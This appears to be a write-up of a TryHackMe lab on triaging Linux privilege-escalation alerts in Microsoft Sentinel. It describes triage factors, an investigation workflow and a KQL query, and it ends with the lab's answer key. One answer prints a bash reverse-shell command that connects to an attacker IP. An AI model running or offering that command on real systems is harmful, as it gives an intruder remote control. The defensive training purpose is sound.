
# SOC Alert Triaging - Tinsel Triage



https://tryhackme.com/room/azuresentinel-aoc2025-a7d3h9k0p2

---

## It’s Raining Alerts

McSkidy is alerted to an unusual surge of activity inside the Azure tenant. Dashboards across the SOC light up as alerts begin flooding Microsoft Sentinel. Early indicators suggest coordinated malicious behavior linked to the Evil Bunnies. At this point, reacting blindly to every alert would waste time and risk missing the real threat.

This is where **alert triaging** becomes essential.

Not all alerts represent real danger. Some are noise. Some are false positives. A small subset signals genuine compromise. The purpose of triage is to impose order on chaos and ensure analysts focus on what actually matters.

---

## Alert Triaging Fundamentals

Alert triaging is the rapid assessment of alerts to determine urgency, credibility, and impact. A strong triage process allows analysts to decide whether to escalate, investigate further, or close an alert with confidence.

When multiple alerts appear simultaneously, analysts should consistently evaluate them using four core dimensions.

### Core Triage Factors

**Severity**  
How bad is it?  
Severity ratings range from informational to critical and provide an initial estimate of risk and urgency.

**Time**  
When did it happen?  
Timestamps and alert frequency help identify whether activity is isolated, ongoing, or part of a repeated pattern.

**Context**  
Where does this fit in the attack lifecycle?  
Mapping alerts to stages such as initial access, privilege escalation, or persistence helps determine attacker progress and intent.

**Impact**  
What is affected?  
Understanding which user, system, or resource is involved allows prioritization based on business importance and potential damage.

These four factors form a fast, reliable mental model for triage:

- Severity: How bad
    
- Time: When
    
- Context: How far
    
- Impact: Who or what
    

Once evaluated, the analyst decides the next action. Escalate to incident response, investigate further, or close the alert if confirmed benign.

---

## Investigating Beyond Triage

After identifying alerts that deserve attention, analysts move from triage into investigation.

A structured approach keeps analysis efficient and defensible.

### Investigation Workflow

1. **Review alert details**  
    Examine entities, event data, and detection logic to determine whether the activity is genuinely suspicious.
    
2. **Examine related logs**  
    Review relevant log sources to validate the alert and identify supporting evidence.
    
3. **Correlate alerts**  
    Look for other alerts involving the same user, host, or IP address. Multiple detections often represent different stages of a single attack.
    
4. **Build a timeline**  
    Reconstruct the sequence of events using timestamps, actions, and affected assets.
    
5. **Decide next steps**  
    Escalate confirmed compromise, investigate further if evidence is incomplete, or close false positives and improve detection logic.
    
6. **Document findings**  
    Record analysis, conclusions, and remediation actions. This strengthens SOC maturity and improves future response.
    

---

## Environment Review

Before triaging alerts, McSkidy reviews the lab environment.

1. Open the Azure Portal and search for **Microsoft Sentinel**.
    
2. Select the Sentinel instance.
    
3. Navigate to **Logs** and query the custom table **Syslog_CL**.
    
4. Run the query to confirm logs are being ingested correctly.
    

This confirms visibility into the environment before investigation begins.

---

## McSkidy Goes Triaging

With theory covered, McSkidy begins working inside Microsoft Sentinel.

1. Open Microsoft Sentinel.
    
2. Under **Threat management**, select **Incidents**.
    
3. Adjust the time range if incidents are not visible.
    
4. Refresh the page if necessary.
    

In this lab, several incidents appear with mixed severities. The priority is clear. High-severity incidents are examined first since they often indicate privilege escalation or system compromise.

---

## High-Severity Incident Analysis

McSkidy selects a high-severity incident titled **Linux PrivEsc – Kernel Module Insertion**.

Initial observations reveal:

- Multiple related events
    
- Several affected entities
    
- Classification as a privilege escalation tactic
    

Clicking **View full details** exposes the incident timeline and similar incidents. This view is critical because it reveals relationships between alerts.

---

## Understanding Related Alerts

When multiple alerts share the same entities, they are rarely isolated. They often represent sequential steps in an intrusion.

Example correlation:

- Root SSH Login from External IP suggests initial access
    
- SUID Discovery suggests privilege escalation reconnaissance
    
- Kernel Module Insertion suggests persistence
    

This linkage transforms individual alerts into a coherent attack narrative.

At this stage, McSkidy understands that the host is likely compromised and the attacker has escalated privileges.

---

## In-Depth Log Analysis with Sentinel

To validate the alert, McSkidy examines raw log data.

From the incident details, she opens the **Event Evidence** section and observes:

- The exact kernel module installed
    
- The installation timestamp
    
- The affected machines
    

To deepen analysis, she pivots to KQL.

### Custom KQL Query

McSkidy switches to KQL mode and queries all syslog events from the affected host:

`set query_now = datetime(2025-10-30T05:09:25.9886229Z); Syslog_CL | where host_s == 'app-02' | project _timestamp_t, host_s, Message`

The results reveal a clear attack sequence:

- Shadow file backup creation
    
- User Alice added to the sudoers group
    
- Modification of the backupuser account
    
- Insertion of a malicious kernel module
    
- Successful root SSH authentication
    

This combination of actions strongly indicates malicious privilege escalation and persistence, not legitimate administration.

---

Q: How many entities are affected by the **Linux PrivEsc - Polkit Exploit Attempt** alert?

A: 10 

Q: What is the severity of the **Linux PrivEsc - Sudo Shadow Access** alert?

A: High

Q: How many accounts were added to the sudoers group in the **Linux PrivEsc - User Added to Sudo Group** alert?

A: 4

Q: What is the name of the kernel module installed in websrv-01?

A: malicious_mod.ko

Q: What is the unusual command executed within websrv-01 by the ops user?

A: /bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1

Q: What is the source IP address of the first successful SSH login to storage-01?

A: 172.16.0.12

Q: What is the external source IP that successfully logged in as root to app-01?

A: 203.0.113.45

Q: Aside from the backup user, what is the name of the user added to the sudoers group inside app-01?

A: deploy



